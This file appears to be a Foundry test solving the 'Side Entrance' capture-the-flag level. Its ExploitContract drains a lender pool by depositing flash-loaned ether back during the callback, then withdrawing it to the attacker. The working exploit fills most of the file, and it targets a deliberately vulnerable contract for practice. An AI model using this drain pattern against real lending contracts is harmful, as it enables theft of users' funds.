// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract ExploitContract is IFlashLoanEtherReceiver {
    uint256 internal constant _ETHER_IN_POOL = 1_000e18;
    SideEntranceLenderPool public target;
    address public owner;

    constructor(address payable _target) {
        target = SideEntranceLenderPool(payable(_target));
        owner = msg.sender;
    }

    function attack1() public {
        console2.log("attack1");
        target.flashLoan(_ETHER_IN_POOL);
        console2.log("flashLoanDone:", address(this).balance);

        console2.log("deposit done");
    }

    function attack2() public {
        target.withdraw();
    }

    function execute() external payable {
        target.deposit{value: _ETHER_IN_POOL}();
    }

    receive() external payable {
        uint256 eth = address(this).balance;
        (bool success,) = payable(owner).call{value: eth}("");
        require(success, "Ether Not Sent Back to Owner");
    }
}

contract SideEntrance is Test {
    uint256 internal constant _ETHER_IN_POOL = 1_000e18;

    Utilities internal _utils;
    SideEntranceLenderPool internal _sideEntranceLenderPool;
    address payable internal _attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        _utils = new Utilities();
        address payable[] memory users = _utils.createUsers(1);
        _attacker = users[0];
        vm.label(_attacker, "Attacker");

        _sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(_sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(_sideEntranceLenderPool), _ETHER_IN_POOL);

        assertEq(address(_sideEntranceLenderPool).balance, _ETHER_IN_POOL);

        attackerInitialEthBalance = address(_attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(_attacker);

        ExploitContract exploiter = new ExploitContract(payable(address(_sideEntranceLenderPool)));
        exploiter.attack1();
        exploiter.attack2();
        //What do we know
        // LenderPool has 1_000e18 ether
        // our attacker is users[0]
        //we need to drain lenderpool

        /**
         * EXPLOIT END *
         */
        _validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function _validation() internal {
        assertEq(address(_sideEntranceLenderPool).balance, 0);
        assertGt(_attacker.balance, attackerInitialEthBalance);
    }
}
